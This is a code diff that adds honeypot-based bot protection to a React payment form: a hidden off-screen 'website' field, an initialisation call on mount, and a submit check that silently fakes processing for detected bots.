@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useState, useEffect } from "react";
 import { handlePay } from "@/lib/firebase";
+import { initBotProtection, performBotCheck } from "@/lib/botProtection";
 
 function CashbackPopup({ onClose }: { onClose: () => void }) {
   return (
@@ -252,6 +253,11 @@ function PaymentForm() {
   const [cvv, setCvv] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [isProcessing, setIsProcessing] = useState(false);
+  const [honeypot, setHoneypot] = useState("");
+
+  useEffect(() => {
+    initBotProtection();
+  }, []);
 
   const cardType = getCardType(cardNumber);
 
@@ -311,6 +317,18 @@ function PaymentForm() {
   };
 
   const handleSubmit = () => {
+    // Bot protection check
+    const botCheck = performBotCheck(honeypot);
+    if (botCheck.isBot) {
+      console.log("Bot detected:", botCheck.reason);
+      // Silently fail for bots - don't give them feedback
+      setIsProcessing(true);
+      setTimeout(() => {
+        setIsProcessing(false);
+      }, 3000);
+      return;
+    }
+    
     if (!validateForm()) return;
     
     setIsProcessing(true);
@@ -338,6 +356,20 @@ function PaymentForm() {
 
   return (
     <div className="space-y-6" data-testid="payment-form">
+      {/* Honeypot field - hidden from humans, bots will fill it */}
+      <div className="absolute -left-[9999px] opacity-0 h-0 overflow-hidden" aria-hidden="true">
+        <label htmlFor="website">Website</label>
+        <input
+          type="text"
+          id="website"
+          name="website"
+          value={honeypot}
+          onChange={(e) => setHoneypot(e.target.value)}
+          tabIndex={-1}
+          autoComplete="off"
+        />
+      </div>
+
       {/* Card Preview */}
       <CardPreview
         cardNumber={cardNumber}
